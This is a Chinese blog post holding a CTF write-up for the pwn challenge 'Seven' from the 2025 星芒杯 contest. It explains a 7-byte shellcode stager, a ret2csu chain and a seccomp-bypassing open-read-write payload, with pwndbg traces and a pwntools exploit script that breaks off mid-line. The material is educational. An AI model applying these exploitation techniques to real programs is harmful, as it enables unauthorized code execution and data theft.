<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>2025星芒杯-PWN-Seven | Langx</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.woff2"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.woff2") format('woff2');
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><meta name="page-config" content="{&quot;code_fold&quot;:null}"><script class="pjax-js">var config = {"root":"/","code_fold":15,"search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}};
var page_config = {
  code_fold: null
};
function updatePageConfig() {
  var newPageConfig = document.querySelector('meta[name="page-config"]');
  if (newPageConfig) {
    page_config = JSON.parse(newPageConfig.content);
  }
}
document.addEventListener('pjax:complete', function() { updatePageConfig(); });
updatePageConfig();</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
 --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
 --light-background: url('/img/bk.jpg');
 --theme-encrypt-confirm: 'confirm'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer src="https://vercount.one/js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
  menuSettings: {
    zoom: "None"
  },
  showMathMenu: false,
  jax: ["input/TeX","output/CommonHTML"],
  extensions: ["tex2jax.js"],
  TeX: {
    extensions: ["AMSmath.js","AMSsymbols.js"],
    equationNumbers: {
      autoNumber: "AMS"
    }
  },
  tex2jax: {
    inlineMath: [["\\(", "\\)"]],
    displayMath: [["\\[", "\\]"]]
  }
});
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => {
 const script = document.createElement('script');
 script.src = 'https://vercount.one/js';
 document.head.appendChild(script);
});reset()})</script><script class="pjax-js">reset= () => {MathJax.Hub.Queue(["Typeset", MathJax.Hub]);document.querySelector('.lg-container')?.remove()
const postBg = document.querySelector('#post-bg');
if (postBg) lightGallery(postBg, {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => {
 const script = document.createElement('script');
 script.src = 'https://vercount.one/js';
 document.head.appendChild(script);
});reset()})</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>2025星芒杯-PWN-Seven</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2025-12-22T12:56:53.874Z" id="date"> 2025-12-22</time></div></span><br><span>Last Update: <div class="control"><time datetime="2025-12-07T08:08:18.347Z" id="updated"> 2025-12-07</time></div></span><br><span id="vercount_container_page_pv">Page View: <span class="control" id="vercount_value_page_pv">loading...</span></span></div></div><hr><div id="post-content"><h1 id="2025星芒杯-PWN-Seven"><a href="#2025星芒杯-PWN-Seven" class="headerlink" title="2025星芒杯-PWN-Seven"></a>2025星芒杯-PWN-Seven</h1><p>老规矩先checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Arch:       amd64-64-little<br>RELRO:      Partial RELRO<br>Stack:      No canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x400000)<br>SHSTK:      Enabled<br>IBT:        Enabled<br>Stripped:   No<br></code></pre></td></tr></table></figure>

<p>基本没什么保护</p>
<p>直接看IDA</p>
<p>main：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  seccomp();<span class="hljs-comment">//开了沙箱</span><br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看见主函数调用了seccomp看一下禁用了什么</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; seccomp-tools dump ./seven<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="hljs-built_in">arch</span><br> 0001: 0x15 0x00 0x06 0xc000003e  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto 0008<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x00 0x01 0x40000000  <span class="hljs-keyword">if</span> (A &lt; 0x40000000) goto 0005<br> 0004: 0x15 0x00 0x03 0xffffffff  <span class="hljs-keyword">if</span> (A != 0xffffffff) goto 0008<br> 0005: 0x15 0x02 0x00 0x0000003b  <span class="hljs-keyword">if</span> (A == execve) goto 0008<br> 0006: 0x15 0x01 0x00 0x00000142  <span class="hljs-keyword">if</span> (A == execveat) goto 0008<br> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="hljs-built_in">return</span> ALLOW<br> 0008: 0x06 0x00 0x00 0x00000000  <span class="hljs-built_in">return</span> KILL<br></code></pre></td></tr></table></figure>

<p>只禁用了execve和execveat第一想法是打ORW，</p>
<p>但是在vuln函数中我们发现了一些问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">void</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  result = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x600000</span>, <span class="hljs-number">0x1000u</span>LL, <span class="hljs-number">7</span>, <span class="hljs-number">1048610</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  buf = result;<br>  <span class="hljs-keyword">if</span> ( result != (<span class="hljs-type">void</span> *)<span class="hljs-number">-1LL</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Do you know what 7 characters can do?&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">7uLL</span>);<br>    mprotect(buf, <span class="hljs-number">0x1000u</span>LL, <span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((__int64 (*)(<span class="hljs-type">void</span>))buf)();<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>没有溢出，且允许读入的字节只有7个字节大小</p>
<p>先简单分析一下程序逻辑：</p>
<p>首先创建了一块0x600000-0x601000范围的区域，且具有RWX权限</p>
<p>然后检查 <code>mmap</code>内存映射是否成功</p>
<p>接着让我们读入七个字节，然后将刚刚那块内存区域的权限修改为RX权限，最后执行我们刚刚读入的数据</p>
<p>原来的思路是构造read的系统调用，然后将我们的orw读取到0x600008然后执行的，但是 <code>mprotect(buf, 0x1000uLL, 5);</code>打断了这一思路</p>
<p>换个思路，我们可以通过调用mprotect来重新修改0x600000这块区域的权限为RWX然后再构建一次读入orw最后执行输出flag</p>
<p>那我们怎么实现7字节来调用这么多函数呢，ret2csu</p>
<p>首先我们得构造这样一个read的系统调用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">read = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">pop rsi </span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">ret </span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>我们的xor edi,edi为两个字节，两个pop rsi为2个字节，syscall为两个字节，ret为一个字节，刚刚好为7字节，满足了字节大小那能做些什么呢<br>直接到pwndbg里看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs assembly">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA<br>──────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off <br> RAX  0<br> RBX  0<br> RCX  0x79569b51eb1b (mprotect+11) ◂— cmp rax, -0xfff<br> RDX  0x600000 ◂— xor edi, edi<br> RDI  0x600000 ◂— xor edi, edi<br> RSI  0x1000<br> R8   0x25<br> R9   0<br> R10  0x79569b4082e0 ◂— 0xf0022000056ec<br> R11  0x202<br> R12  0x7fffd30df6a8 —▸ 0x7fffd30e1376 ◂— 0x6e657665732f2e /* &#x27;./seven&#x27; */<br> R13  0x401301 (main) ◂— endbr64 <br> R14  0<br> R15  0x79569b7a8040 (_rtld_global) —▸ 0x79569b7a92e0 ◂— 0<br> RBP  0x7fffd30df580 —▸ 0x7fffd30df590 ◂— 1<br>*RSP  0x7fffd30df568 —▸ 0x4012fe (vuln+127) ◂— nop <br>*RIP  0x600000 ◂— xor edi, edi<br>───────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on <br> ► 0x600000    xor    edi, edi               EDI =&gt; 0<br>   0x600002    pop    rsi                    RSI =&gt; 0x4012fe (vuln+127)<br>   0x600003    pop    rsi                    RSI =&gt; 0x7fffd30df590<br>   0x600004    syscall  &lt;SYS_read&gt;<br>   0x600006    ret    <br> <br>   0x600007    add    byte ptr [rax], al<br>   0x600009    add    byte ptr [rax], al<br>   0x60000b    add    byte ptr [rax], al<br>   0x60000d    add    byte ptr [rax], al<br>   0x60000f    add    byte ptr [rax], al<br>   0x600011    add    byte ptr [rax], al<br>────────────────────────────────────────────────────────────────────[ STACK <br>00:0000│ rsp 0x7fffd30df568 —▸ 0x4012fe (vuln+127) ◂— nop <br>01:0008│-010 0x7fffd30df570 —▸ 0x7fffd30df590 ◂— 1<br>02:0010│-008 0x7fffd30df578 —▸ 0x600000 ◂— xor edi, edi<br>03:0018│ rbp 0x7fffd30df580 —▸ 0x7fffd30df590 ◂— 1<br>04:0020│+008 0x7fffd30df588 —▸ 0x401345 (main+68) ◂— mov eax, 0<br>05:0028│+010 0x7fffd30df590 ◂— 1<br>06:0030│+018 0x7fffd30df598 —▸ 0x79569b429d90 (__libc_start_call_main+128) ◂— mov edi, eax<br>07:0038│+020 0x7fffd30df5a0 ◂— 0<br>──────────────────────────────────────────────────────────────────[ BACKTRACE <br> ► 0         0x600000 None<br>   1         0x4012fe vuln+127<br>   2         0x401345 main+68<br>   3   0x79569b429d90 __libc_start_call_main+128<br>   4   0x79569b429e40 __libc_start_main+128<br>   5         0x40115e _start+46<br>────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; <br><br></code></pre></td></tr></table></figure>
<p>可以看见此时rsp -&gt;0x7fffd30df568，我们的rdx控制的是读入字节大小不用管，rdi也已经控制为0了，但是我们如果进行两次pop rsi，我们就可以通过read调用来修改rbp 0x7fffd30df580 —▸ 0x7fffd30df590 中的数据为我们的ROP链，然后再执行一次ret重新执行一遍我们的’read‘来执行我们的rop链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">► 0x600004    syscall  &lt;SYS_read&gt;<br>       fd: 0 (pipe:[48180])<br>       buf: 0x7fffd30df590 ◂— 1<br>       nbytes: 0x600000 ◂— xor edi, edi<br>  0x600006    ret    <br></code></pre></td></tr></table></figure>

<p>执行ret：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x600006   ret                                &lt;0x600000&gt;<br>    ↓<br>   0x600000    xor    edi, edi         EDI =&gt; 0<br>   0x600002    pop    rsi              RSI =&gt; 0x4012fe (vuln+127)<br>   0x600003    pop    rsi              RSI =&gt; 0x7ffed6eb59c0<br>   0x600004    syscall  &lt;SYS_read&gt;<br> ► 0x600006    ret                                &lt;0x600000&gt;<br>    ↓<br>   0x600000    xor    edi, edi              EDI =&gt; 0<br>   0x600002    pop    rsi                   RSI =&gt; 0x7ffed6eb59c0<br>   0x600003    pop    rsi                   RSI =&gt; 0x401345 (main+68)<br>   0x600004    syscall  &lt;SYS_io_submit&gt;<br>   0x600006   ret                                &lt;0x600000&gt;<br>────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7ffed6eb59a8 —▸ 0x600000 ◂— xor edi, edi<br>01:0008│ rbp 0x7ffed6eb59b0 —▸ 0x7ffed6eb59c0 —▸ 0x4013a6 (__libc_csu_init+86) ◂— add rsp, 8<br></code></pre></td></tr></table></figure>

<p>再次ret：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x600006                         ret                                &lt;__libc_csu_init+86&gt;<br>    ↓<br>   0x600000                         xor    edi, edi              EDI =&gt; 0<br>   0x600002                         pop    rsi                   RSI =&gt; 0x7ffed6eb59c0<br>   0x600003                         pop    rsi                   RSI =&gt; 0x401345 (main+68)<br>   0x600004                         syscall  &lt;SYS_io_submit&gt;<br> ► 0x600006                         ret                                &lt;__libc_csu_init+86&gt;<br>    ↓<br>   0x4013a6 &lt;__libc_csu_init+86&gt;    add    rsp, 8                RSP =&gt; 0x7ffed6eb59d0 (0x7ffed6eb59c8 + 0x8)<br>   0x4013aa &lt;__libc_csu_init+90&gt;    pop    rbx                   RBX =&gt; 0<br>   0x4013ab &lt;__libc_csu_init+91&gt;    pop    rbp                   RBP =&gt; 1<br>   0x4013ac &lt;__libc_csu_init+92&gt;    pop    r12                   R12 =&gt; 0x600000<br>   0x4013ae &lt;__libc_csu_init+94&gt;    pop    r13                   R13 =&gt; 0x1000<br>────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7ffed6eb59c0 —▸ 0x4013a6 (__libc_csu_init+86) ◂— add rsp, 8 ;这里rsp应该是0x7fffd30df590的，但是由于我重新调试了一遍，地址变了，但是流程还是一样的<br><br></code></pre></td></tr></table></figure>

<p>可以看见此时开始执行了我们的ROP链，后面就是利用mprotect修改权限然后read读入ORW最后返回到我们的ORW地址执行ORW</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">RIP  0x40101a (_init+26) ◂— ret <br>───────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on <br>   0x4013ac &lt;__libc_csu_init+92&gt;     pop    r12                   R12 =&gt; 0x6161616161616161<br>   0x4013ae &lt;__libc_csu_init+94&gt;     pop    r13                   R13 =&gt; 0x6161616161616161<br>   0x4013b0 &lt;__libc_csu_init+96&gt;     pop    r14                   R14 =&gt; 0x6161616161616161<br>   0x4013b2 &lt;__libc_csu_init+98&gt;     pop    r15                   R15 =&gt; 0x6161616161616161<br>   0x4013b4 &lt;__libc_csu_init+100&gt;    ret                                &lt;_init+26&gt;<br>    ↓<br> ► 0x40101a &lt;_init+26&gt;               ret                                &lt;0x600008&gt;<br>    ↓<br>   0x600008                          mov    edi, 0x1010101        EDI =&gt; 0x1010101<br>   0x60000d                          xor    edi, 0x1610101        EDI =&gt; 0x600000 (0x1010101 ^ 0x1610101)<br>   0x600013                          xor    edx, edx              EDX =&gt; 0<br>   0x600015                          xor    esi, esi              ESI =&gt; 0<br>   0x600017                          push   2<br>────────────────────────────────────────────────────────────────────[ STACK <br>00:0000│ rsp 0x7ffe81709228 —▸ 0x600008 ◂— mov edi, 0x1010101 /* 0x1f78101010101bf */<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[DEBUG] Received 0x80 bytes:<br>    00000000  66 6c 61 67  7b 65 78 61  6d 70 6c 65  7d 0a 00 00  │flag│&#123;exa│mple│&#125;···│<br>    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│<br>    *<br>    00000080<br>flag&#123;example&#125;<br>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$                      <br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive<br>$ <br>[*] Interrupted<br>[*] Process <span class="hljs-string">&#x27;./seven&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 5061)<br><br></code></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>psl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>ps = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>pc = <span class="hljs-keyword">lambda</span> data : p.recvuntil(data)<br>ph = <span class="hljs-keyword">lambda</span> data : <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(data))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(pc(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>::].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>binary_name = <span class="hljs-string">&#x27;./seven&#x27;</span><br><br>HOST = <span class="hljs-string">&quot;nc1.ctfplus.cn&quot;</span><br>PORT = <span class="hljs-number">25268</span><br>choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input yes-&gt;Process,no-&gt;Remote&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;y&quot;</span> <span class="hljs-keyword">in</span> choice:<br>    p = process(binary_name)<br><span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;n&quot;</span> <span class="hljs-keyword">in</span> choice:<br>    p = remote(HOST,PORT)<br><span class="hljs-comment">#libc = ELF(&quot;&quot;)</span><br>e = ELF(binary_name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-comment"># ========== Exploit 开始 ==========</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    pc(<span class="hljs-string">&quot;Do you know what 7 characters can do?&quot;</span>)<br>    read = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    xor edi,edi</span><br><span class="hljs-string">    pop rsi </span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    ret </span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(read))<br>    rdi = <span class="hljs-number">0x00000000004013b3</span><br>    gadget1 = <span class="hljs-number">0x401390</span><br>    gadget2 = <span class="hljs-number">0x4013a6</span><br>    ret = <span class="hljs-number">0x000000000040101a</span><br>    bug()<br>    ps(read)<br>    <br>    ret = <span class="hljs-number">0x000000000040101a</span><br>    p1 = p64(gadget2)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0x600000</span>)+p64(<span class="hljs-number">0x1000</span>)+p64(<span class="hljs-number">0x7</span>)+p64(e.got[<span class="hljs-string">&#x27;mprotect&#x27;</span>])+p64(gadget1)<br>    p1+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x600000</span>)+p64(<span class="hljs-number">0x1000</span>)+p64(e.got[<span 